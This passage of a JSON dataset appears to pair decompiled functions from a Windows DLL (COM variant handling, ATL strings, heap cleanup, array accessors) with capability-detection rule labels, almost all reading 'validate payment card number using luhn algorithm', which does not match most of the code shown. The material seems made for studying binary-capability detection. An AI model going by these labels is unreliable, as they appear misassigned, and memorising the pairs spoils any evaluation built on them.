            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.18001d22c(ulong arg1, ulong arg2, int64_t *arg3)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.18001d014(arg1, arg2);\n    *arg3 = iVar2;\n    if (iVar2 == 0) {\n        iVar2 = fcn.18001d0e8(arg1, arg2);\n        *arg3 = iVar2;\n        uVar1 = ~-(iVar2 != 0) & 0x80004002;\n    }\n    else {\n        fcn.18001d178(arg1);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 161
    },
    "18001d2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d2a4(ulong arg1)\n\n{\n    code *pcVar1;\n    \n    if (-1 < arg1) {\n        return;\n    }\n    if (arg1 == -0x7ff8fff2) {\n        fcn.1800124cc();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.180014130(arg1);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 115
    },
    "18001d35": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d35c(int16_t *arg1, ulong noname_1, int16_t *arg3)\n\n{\n    uint32_t uVar1;\n    \n    if (arg3 == NULL) {\n        arg3 = arg1;\n    }\n    if ((arg3 != arg1) || (noname_1 != *arg1)) {\n        uVar1 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(arg1, arg3, 0, noname_1);\n        fcn.18001d2a4(uVar1);\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "18001d39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18001d390(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    \n    if (arg1 != arg2) {\n        uVar1 = (*_sym.imp.OLEAUT32.dll_VariantCopyInd)();\n        fcn.18001d2a4(uVar1);\n    }\n    return arg1;\n}\n",
        "token_count": 84
    },
    "18001d73": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001d734(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    \n    fcn.180033c90(arg1, 0, 0x18);\n    uVar1 = (*_sym.imp.OLEAUT32.dll_VariantCopyInd)(arg1, arg2);\n    fcn.18001d2a4(uVar1);\n    return arg1;\n}\n",
        "token_count": 92
    },
    "18001d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d904(code **arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    ulong in_R8;\n    \n    *arg1 = \n    vtable.ATL::CFixedStringT_class_ATL::CStringT_wchar_t__class_StrTraitMFC_wchar_t__class_ATL::ChTraitsCRT_wchar_t_____256_.0\n    ;\n    fcn.1800089e0(arg1 + 3, arg2, in_R8);\n    pcVar3 = arg1[3];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    *arg1 = vtable.ATL::CFixedStringMgr.0;\n    return;\n}\n",
        "token_count": 227
    },
    "18001dd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001dd50(int64_t arg1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    ulong unaff_RBX;\n    ulong in_R9;\n    \n    fcn.1800096a4(*(arg1 + 0x18));\n    if ((*(arg1 + 0x48) != 0) &&\n       (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x18006daa0, 0, *(arg1 + 0x48), in_R9, unaff_RBX),  iVar2 == 0)) {\n        puVar1 = fcn.180035b28();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.180035ae0(uVar3);\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "18001dee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.18001deec(int64_t *arg1, ulong noname_1, int64_t arg3, ulong arg4)\n\n{\n    (**(*arg1 + 0x188))(arg1, noname_1, arg3 + 0x10, arg3, 0, arg4);\n    return;\n}\n",
        "token_count": 73
    },
    "18001df4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.18001df4c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    int64_t *apiStack24 [2];\n    \n    iVar1 = (*_sym.imp.OLEAUT32.dll_VariantInit)(in_stack_00000030);\n    apiStack24[0] = NULL;\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ole32.dll_CoGetClassObject)();\n        if (iVar1 < 0) {\n            return iVar1;\n        }\n        iVar1 = (**(*apiStack24[0] + 0x18))(apiStack24[0], arg2, arg4, in_stack_00000028);\n    }\n    else {\n        iVar1 = (*_sym.imp.ole32.dll_CoGetClassObject)(arg1, arg3, 0, 0x180056168, apiStack24);\n        if (iVar1 < 0) {\n            return iVar1;\n        }\n        iVar1 = (**(*apiStack24[0] + 0x38))(apiStack24[0], arg2, 0, arg4);\n    }\n    (**(*apiStack24[0] + 0x10))();\n    return iVar1;\n}\n",
        "token_count": 300
    },
    "18001e3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001e3dc(int64_t arg1)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t *piStackX8;\n    \n    fcn.180033c90(arg1 + 0xb8, 0, 0x18);\n    puVar1 = *(arg1 + 0x80);\n    piStackX8 = NULL;\n    *(arg1 + 0xb8) = 0x18;\n    if (puVar1 == NULL) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    iVar3 = (***puVar1)(puVar1, 0x180056198, &piStackX8);\n    if (-1 < iVar3) {\n        (**(*piStackX8 + 0x18))(piStackX8, arg1 + 0xb8);\n        (**(*piStackX8 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "18001e45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18001e45c(int64_t arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    uchar auVar2 [16];\n    int32_t iVar3;\n    ulong arg1_00;\n    uint8_t *arg1_01;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    iVar6 = 0;\n    if ((*(arg1 + 200) == 0) || (*(arg1 + 0xc0) == 0)) {\n        iVar6 = 0;\n    }\n    else {\n        auVar2 = ZEXT416(6) * ZEXT216(*(arg1 + 200));\n        arg1_00 = SUB168(auVar2, 0);\n        if (SUB168(auVar2 >> 0x40, 0) != 0) {\n            arg1_00 = 0xffffffffffffffff;\n        }\n        arg1_01 = fcn.180009660(arg1_00);\n        iVar3 = (*_sym.imp.USER32.dll_CopyAcceleratorTableW)(*(arg1 + 0xc0), arg1_01, *(arg1 + 200));\n        puVar5 = arg1_01;\n        iVar7 = iVar6;\n        if (0 < iVar3) {\n            do {\n                if (arg2 == 0) {\n                    fcn.180012514();\n                    pcVar1 = swi(3);\n                    iVar6 = (*pcVar1)();\n                    return iVar6;\n                }\n                uVar4 = 0;\n                if (*(arg2 + 8) == 0x106) {\n                    uVar4 = 0x10;\n                }\n                if (((*puVar5 & 0xfd) == uVar4) && (*(puVar5 + 2) == *(arg2 + 0x10))) {\n                    iVar6 = 1;\n                    break;\n                }\n                iVar7 = iVar7 + 1;\n                puVar5 = puVar5 + 6;\n            } while (iVar7 < iVar3);\n        }\n        fcn.1800096a4(arg1_01);\n    }\n    return iVar6;\n}\n",
        "token_count": 487
    },
    "18001e62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001e628(int64_t arg1, ulong noname_1, ulong pv)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t aiStackX8 [4];\n    \n    piVar1 = *(arg1 + 0x88);\n    if (piVar1 == NULL) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    aiStackX8[0] = 0;\n    iVar3 = (**(*piVar1 + 0x18))(piVar1, aiStackX8);\n    if ((-1 < iVar3) && (*(arg1 + 0x48) != aiStackX8[0])) {\n        *(arg1 + 0x48) = aiStackX8[0];\n        if (*(arg1 + 0x50) != 0) {\n            fcn.180017ca8(*(arg1 + 0x50), aiStackX8[0]);\n            *(*(arg1 + 0x50) + 0xa0) = arg1;\n        }\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "18001f2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001f2b8(int64_t arg1, ulong arg2, ulong *arg3, ulong *arg4)\n\n{\n    ulong uVar1;\n    int64_t pvarg;\n    \n    if (arg4 != NULL) {\n        *arg4 = 0;\n    }\n    pvarg = *(arg1 + 0xe0);\n    while( true ) {\n        if (pvarg == 0) {\n            return 0;\n        }\n        if (*(pvarg + 0xc) == arg2) break;\n        pvarg = *(pvarg + 0x20);\n    }\n    uVar1 = fcn.18001f264(pvarg);\n    *arg3 = uVar1;\n    return 0;\n}\n",
        "token_count": 163
    },
    "18001f4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18001f4f8(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    ulong in_R9;\n    int32_t iStackX8;\n    int32_t iStackX12;\n    ulong uVar6;\n    uchar auStack48 [40];\n    \n    uVar6 = 0xfffffffffffffffe;\n    iStackX12 = *(arg1 + 0x68) - *(arg1 + 0x60);\n    iStackX8 = *(arg1 + 100) - *(arg1 + 0x5c);\n    fcn.180013020(auStack48, 0);\n    fcn.18002d404(auStack48, &iStackX8);\n    piVar1 = *(arg1 + 0x80);\n    if (piVar1 == NULL) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        uVar5 = (*pcVar2)();\n        return uVar5;\n    }\n    iVar3 = (**(*piVar1 + 0x88))(piVar1, 1, &iStackX8, in_R9, uVar6);\n    if (-1 < iVar3) {\n        iVar4 = (**(**(arg1 + 0x80) + 0x90))(*(arg1 + 0x80), 1, &iStackX8);\n        if (-1 < iVar4) {\n            fcn.18002d4c4(auStack48, &iStackX8);\n            *(arg1 + 100) = iStackX8 + *(arg1 + 0x5c);\n            *(arg1 + 0x68) = *(arg1 + 0x60) + iStackX12;\n        }\n    }\n    fcn.180013084(auStack48);\n    return -1 < iVar3;\n}\n",
        "token_count": 440
    },
    "18002120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180021200(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    ushort uVar5;\n    int64_t *piStackX8;\n    \n    if ((*(arg1 + 0xc) != -0x7ffeffff) && (piVar1 = *arg1,  piVar1 != NULL)) {\n        if (piVar1[0x10] == 0) {\n            fcn.180012514();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        iVar3 = (***piVar1[0x10])(piVar1[0x10], 0x180056088, &piStackX8);\n        if (iVar3 < 0) {\n            iVar4 = fcn.18001f264(arg1);\n            if (iVar4 != 0) {\n                uVar5 = 0xd;\n                if (arg1[2][0x1b] != 0) {\n                    uVar5 = 0x800d;\n                }\n                (**(**arg1 + 0xe0))(*arg1, *(arg1 + 0xc), uVar5, iVar4);\n            }\n        }\n        else {\n            (**(*piStackX8 + 0x18))(piStackX8, *(arg1 + 0xc), arg1[2] != NULL, arg1 + 3);\n            (**(*piStackX8 + 0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 354
    },
    "18002150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180021508(ulong *arg1)\n\n{\n    fcn.1800096a4(*arg1);\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 40
    },
    "18002167": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180021678(int64_t arg1, uint64_t arg2, ulong *arg3)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    ulong *puVar3;\n    int64_t iVar4;\n    \n    uVar2 = 0;\n    if (arg3 != NULL) {\n        if (*(arg1 + 0x38) == '\\0') {\n            iVar4 = *(arg1 + 0x28);\n            if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar4 + 0x10)) {\n                uVar2 = arg2 - *(iVar4 + 0x10);\ncode_r0x0001800216d0:\n                puVar3 = *(iVar4 + 8 + uVar2 * 0x50) + *(arg1 + 0x10);\n                *arg3 = *puVar3;\n                arg3[1] = puVar3[1];\n                *(arg3 + 2) = *(puVar3 + 2);\n                *(arg3 + 0x12) = *(puVar3 + 0x12);\n                return 1;\n            }\n        }\n        else if (*(arg1 + 0x18) != 0) {\n            iVar4 = *(arg1 + 0x28);\n            puVar1 = iVar4 + 0x10;\n            do {\n                if (*puVar1 == arg2) goto code_r0x0001800216d0;\n                uVar2 = uVar2 + 1;\n                puVar1 = puVar1 + 10;\n            } while (uVar2 < *(arg1 + 0x18));\n        }\n    }\n    return 0;\n}\n",
        "token_count": 381
    },
    "18002170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180021704(int64_t arg1, uint64_t arg2, uint *arg3)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    \n    uVar2 = 0;\n    if (arg3 != NULL) {\n        if (*(arg1 + 0x38) == '\\0') {\n            iVar4 = *(arg1 + 0x28);\n            if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar4 + 0x10)) {\n                uVar2 = arg2 - *(iVar4 + 0x10);\ncode_r0x00018002175c:\n                puVar3 = *(iVar4 + 8 + uVar2 * 0x50) + *(arg1 + 0x10);\n                *arg3 = *puVar3;\n                *(arg3 + 1) = *(puVar3 + 1);\n                return 1;\n            }\n        }\n        else if (*(arg1 + 0x18) != 0) {\n            iVar4 = *(arg1 + 0x28);\n            puVar1 = iVar4 + 0x10;\n            do {\n                if (*puVar1 == arg2) goto code_r0x00018002175c;\n                uVar2 = uVar2 + 1;\n                puVar1 = puVar1 + 10;\n            } while (uVar2 < *(arg1 + 0x18));\n        }\n    }\n    return 0;\n}\n",
        "token_count": 345
    },
    "18002178": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180021780(int64_t arg1, uint64_t arg2, uint *arg3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    uint *puVar6;\n    int64_t iVar7;\n    \n    uVar5 = 0;\n    if (arg3 != NULL) {\n        if (*(arg1 + 0x38) == '\\0') {\n            iVar7 = *(arg1 + 0x28);\n            if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar7 + 0x10)) {\n                uVar5 = arg2 - *(iVar7 + 0x10);\ncode_r0x0001800217e2:\n                puVar6 = *(iVar7 + 8 + uVar5 * 0x50) + *(arg1 + 0x10);\n                uVar1 = puVar6[1];\n                uVar2 = puVar6[2];\n                uVar3 = puVar6[3];\n                *arg3 = *puVar6;\n                arg3[1] = uVar1;\n                arg3[2] = uVar2;\n                arg3[3] = uVar3;\n                return 1;\n            }\n        }\n        else if (*(arg1 + 0x18) != 0) {\n            iVar7 = *(arg1 + 0x28);\n            puVar4 = iVar7 + 0x10;\n            do {\n                if (*puVar4 == arg2) goto code_r0x0001800217e2;\n                uVar5 = uVar5 + 1;\n                puVar4 = puVar4 + 10;\n            } while (uVar5 < *(arg1 + 0x18));\n        }\n    }\n    return 0;\n}\n",
        "token_count": 414
    },
    "18002180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180021800(int64_t arg1, uint64_t arg2, uint *arg3)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*(arg1 + 0x38) == '\\0') {\n        iVar3 = *(arg1 + 0x28);\n        if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar3 + 0x10)) {\n            uVar2 = arg2 - *(iVar3 + 0x10);\ncode_r0x00018002185c:\n            *(*(iVar3 + 8 + uVar2 * 0x50) + *(arg1 + 0x10)) = *arg3;\n            return 1;\n        }\n    }\n    else if (*(arg1 + 0x18) != 0) {\n        iVar3 = *(arg1 + 0x28);\n        puVar1 = iVar3 + 0x10;\n        do {\n            if (*puVar1 == arg2) goto code_r0x00018002185c;\n            uVar2 = uVar2 + 1;\n            puVar1 = puVar1 + 10;\n        } while (uVar2 < *(arg1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 302
    },
    "18002187": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180021878(int64_t arg1, uint64_t arg2, ulong *arg3)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*(arg1 + 0x38) == '\\0') {\n        iVar3 = *(arg1 + 0x28);\n        if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar3 + 0x10)) {\n            uVar2 = arg2 - *(iVar3 + 0x10);\ncode_r0x0001800218d4:\n            *(*(iVar3 + 8 + uVar2 * 0x50) + *(arg1 + 0x10)) = *arg3;\n            return 1;\n        }\n    }\n    else if (*(arg1 + 0x18) != 0) {\n        iVar3 = *(arg1 + 0x28);\n        puVar1 = iVar3 + 0x10;\n        do {\n            if (*puVar1 == arg2) goto code_r0x0001800218d4;\n            uVar2 = uVar2 + 1;\n            puVar1 = puVar1 + 10;\n        } while (uVar2 < *(arg1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 304
    },
    "1800218f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800218f0(int64_t arg1, uint64_t arg2, ulong *arg3)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar3 = 0;\n    if (arg3 != NULL) {\n        if (*(arg1 + 0x38) == '\\0') {\n            iVar2 = *(arg1 + 0x28);\n            if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar2 + 0x10)) {\n                uVar3 = arg2 - *(iVar2 + 0x10);\ncode_r0x00018002195f:\n                *arg3 = *(*(iVar2 + 8 + uVar3 * 0x50) + *(arg1 + 0x10));\n                return 1;\n            }\n        }\n        else if (*(arg1 + 0x18) != 0) {\n            iVar2 = *(arg1 + 0x28);\n            puVar1 = iVar2 + 0x10;\n            do {\n                if (*puVar1 == arg2) goto code_r0x00018002195f;\n                uVar3 = uVar3 + 1;\n                puVar1 = puVar1 + 10;\n            } while (uVar3 < *(arg1 + 0x18));\n        }\n    }\n    return 0;\n}\n",
        "token_count": 314
    },
    "18002197": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18002197c(int64_t arg1, uint64_t arg2, uint *arg3)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint64_t *puVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    \n    uVar6 = 0;\n    if (*(arg1 + 0x38) == '\\0') {\n        iVar7 = *(arg1 + 0x28);\n        if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar7 + 0x10)) {\n            uVar6 = arg2 - *(iVar7 + 0x10);\ncode_r0x0001800219d8:\n            uVar2 = arg3[1];\n            uVar3 = arg3[2];\n            uVar4 = arg3[3];\n            puVar1 = *(iVar7 + 8 + uVar6 * 0x50) + *(arg1 + 0x10);\n            *puVar1 = *arg3;\n            puVar1[1] = uVar2;\n            puVar1[2] = uVar3;\n            puVar1[3] = uVar4;\n            return 1;\n        }\n    }\n    else if (*(arg1 + 0x18) != 0) {\n        iVar7 = *(arg1 + 0x28);\n        puVar5 = iVar7 + 0x10;\n        do {\n            if (*puVar5 == arg2) goto code_r0x0001800219d8;\n            uVar6 = uVar6 + 1;\n            puVar5 = puVar5 + 10;\n        } while (uVar6 < *(arg1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 404
    },
    "1800219f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800219f8(int64_t arg1, uint64_t arg2, uchar *arg3)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*(arg1 + 0x38) == '\\0') {\n        iVar3 = *(arg1 + 0x28);\n        if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar3 + 0x10)) {\n            uVar2 = arg2 - *(iVar3 + 0x10);\ncode_r0x000180021a54:\n            *(*(iVar3 + 8 + uVar2 * 0x50) + *(arg1 + 0x10)) = *arg3;\n            return 1;\n        }\n    }\n    else if (*(arg1 + 0x18) != 0) {\n        iVar3 = *(arg1 + 0x28);\n        puVar1 = iVar3 + 0x10;\n        do {\n            if (*puVar1 == arg2) goto code_r0x000180021a54;\n            uVar2 = uVar2 + 1;\n            puVar1 = puVar1 + 10;\n        } while (uVar2 < *(arg1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 304
    },
    "180021a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180021a70(int64_t arg1, uint64_t arg2, ushort *arg3)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*(arg1 + 0x38) == '\\0') {\n        iVar3 = *(arg1 + 0x28);\n        if (arg2 <= *(arg1 + 0x18) + -1 + *(iVar3 + 0x10)) {\n            uVar2 = arg2 - *(iVar3 + 0x10);\ncode_r0x000180021acc:\n            *(*(iVar3 + 8 + uVar2 * 0x50) + *(arg1 + 0x10)) = *arg3;\n            return 1;\n        }\n    }\n    else if (*(arg1 + 0x18) != 0) {\n        iVar3 = *(arg1 + 0x28);\n        puVar1 = iVar3 + 0x10;\n        do {\n            if (*puVar1 == arg2) goto code_r0x000180021acc;\n            uVar2 = uVar2 + 1;\n            puVar1 = puVar1 + 10;\n        } while (uVar2 < *(arg1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 301
    },
    "180021d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180021d04(int64_t arg1)\n\n{\n    int64_t arg1_00;\n    ulong uVar1;\n    ulong uStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    \n    if (*(arg1 + 0x90) == 0) {\n        if (*(arg1 + 0x70) != 0) {\n            uStack40 = *(arg1 + 0x80);\n            uStack32 = 0;\n            uStack24 = 0;\n            uStack48 = 0;\n            uStack56 = 1;\n            uVar1 = (**(**(arg1 + 0x10) + 0x40))(*(arg1 + 0x10), 1, 0x1800567d8, 0, &uStack56);\n            return uVar1;\n        }\n    }\n    else {\n        arg1_00 = *(arg1 + 0xa0);\n        if ((arg1_00 != 0) && (*(arg1_00 + 0x18) != 0)) {\n            uVar1 = fcn.180021524(arg1_00);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 279
    },
    "180021d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180021d8c(int64_t arg1, int64_t arg2)\n\n{\n    if (*(arg1 + 0x10) != arg2) {\n        *(arg1 + 0x10) = arg2;\n        fcn.180021200(arg1);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "18002254": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180022540(ulong noname_0, int64_t **pvargDest, ulong *arg3)\n\n{\n    int64_t *apiStackX16 [3];\n    \n    if (pvargDest == NULL) {\n        return;\n    }\n    if ((noname_0 & 0x2000) == 0) {\n        if (noname_0 == 8) {\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(*pvargDest);\n        }\n        else {\n            if (noname_0 != 9) {\n                if (noname_0 == 0xc) {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(pvargDest);\n                    goto code_r0x000180022608;\n                }\n                if (noname_0 != 0xd) {\n                    if ((((noname_0 == 0x88) && (apiStackX16[0] = NULL,  arg3 != NULL)) &&\n                        ((***arg3)(arg3, 0x1800517c0, apiStackX16),  apiStackX16[0] != NULL)) &&\n                       ((**(*apiStackX16[0] + 0x20))(apiStackX16[0], *pvargDest, 0),  apiStackX16[0] != NULL)) {\n                        (**(*apiStackX16[0] + 0x10))();\n                    }\n                    goto code_r0x000180022608;\n                }\n            }\n            if (*pvargDest == NULL) goto code_r0x000180022608;\n            (**(**pvargDest + 0x10))();\n        }\n    }\n    else {\n        if (*pvargDest == NULL) goto code_r0x000180022608;\n        (*_sym.imp.OLEAUT32.dll_SafeArrayGetDim)();\n    }\n    *pvargDest = NULL;\ncode_r0x000180022608:\n    if (((noname_0 & 0x1000) != 0) && ((noname_0 & 0x4000) != 0xffffffff)) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(pvargDest[1]);\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "1800229d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.1800229d0(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    \n    iVar4 = 0;\n    uVar5 = 0;\n    uVar1 = *(*(arg1 + 0x10) + 8);\n    if (uVar1 != 0) {\n        iVar6 = 0;\n        do {\n            piVar2 = *(arg1 + 8);\n            if (piVar2 == NULL) {\n                iVar4 = -0x7fffbffe;\n            }\n            else {\n                piVar3 = *(arg1 + 0x10);\n                if (uVar5 < *(piVar3 + 1)) {\n                    uVar7 = *(iVar6 + *piVar3);\n                }\n                else {\n                    uVar7 = 0;\n                }\n                iVar4 = (**(*piVar2 + 0x20))(piVar2, *(arg1 + 0x18), uVar7, piVar3[2]);\n            }\n            if (iVar4 < 0) {\n                return iVar4;\n            }\n            uVar5 = uVar5 + 1;\n            iVar6 = iVar6 + 0x10;\n        } while (uVar5 < uVar1);\n    }\n    return iVar4;\n}\n",
        "token_count": 328
    },
    "18002d58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d584(int64_t arg1)\n\n{\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 8) = 0;\n    fcn.18002a100(*(arg1 + 0x28));\n    *(arg1 + 0x28) = 0;\n    return;\n}\n",
        "token_count": 105
    },
    "18002685": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
